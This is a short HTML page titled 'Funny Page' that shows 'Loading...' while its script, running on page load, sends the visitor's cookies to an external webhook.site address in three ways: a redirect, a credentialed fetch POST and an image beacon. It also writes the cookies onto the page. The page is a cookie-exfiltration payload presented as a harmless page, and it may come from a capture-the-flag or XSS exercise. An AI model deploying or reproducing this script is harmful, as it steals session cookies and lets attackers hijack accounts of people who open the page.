<!DOCTYPE html>
<html>
<head>
    <title>Funny Page</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // Method 1: Try to navigate with cookies in URL
        setTimeout(() => {
            window.location = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?' + document.cookie;
        }, 1000);

        // Method 2: Try fetch with credentials
        fetch('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd', {
            method: 'POST',
            credentials: 'include',
            mode: 'no-cors',
            body: document.cookie
        });

        // Method 3: Create img with cookies in src
        const img = document.createElement('img');
        img.src = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=' + encodeURIComponent(document.cookie);
        document.body.appendChild(img);

        // Method 4: Try to read and display cookies directly
        document.write("Cookies: " + document.cookie);
    </script>
</body>
</html>
